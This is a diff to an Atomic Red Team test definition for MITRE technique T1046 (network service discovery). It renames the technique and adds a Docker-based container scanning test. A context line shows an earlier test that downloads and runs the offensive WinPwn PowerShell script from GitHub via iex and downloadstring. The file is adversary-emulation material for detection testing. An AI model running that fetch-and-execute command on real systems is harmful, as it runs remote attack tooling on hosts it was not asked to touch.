@@ -1,5 +1,5 @@
 attack_technique: T1046
-display_name: Network Service Scanning
+display_name: Network Service Discovery
 atomic_tests:
 - name: Port Scan
   auto_generated_guid: 68e907da-2539-48f6-9fc9-257a78c05540
@@ -166,3 +166,30 @@ atomic_tests:
       iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
       fruit -noninteractive -consoleoutput
     name: powershell
+- name: Network Service Discovery for Containers
+  auto_generated_guid:
+  description: Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.
+  supported_platforms:
+  - containers
+  dependency_executor_name: sh
+  dependencies:
+  - description: Verify docker is installed.
+    prereq_command: |
+      which docker
+    get_prereq_command: |
+      if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
+
+  - description: Verify docker service is running.
+    prereq_command: |
+      sudo systemctl status docker  --no-pager
+    get_prereq_command: |
+      sudo systemctl start docker
+  executor:
+    command: |-
+      docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/
+      docker run --name t1046_container  -d -t t1046
+      docker exec t1046_container ./test.sh
+    cleanup_command: |-
+      docker stop t1046_container
+      docker rmi -f t1046
+    name: sh
